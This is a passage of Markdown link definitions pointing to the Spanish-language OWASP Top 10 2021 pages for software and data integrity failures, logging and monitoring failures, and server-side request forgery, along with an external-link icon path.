[ref8]:https://owasp.org/Top10/2021/es/A08_2021-Software_and_Data_Integrity_Failures/
[ref9]:https://owasp.org/Top10/2021/es/A09_2021-Security_Logging_and_Monitoring_Failures/
[ref10]:https://owasp.org/Top10/2021/es/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/
[icono]:/img/external-link.svg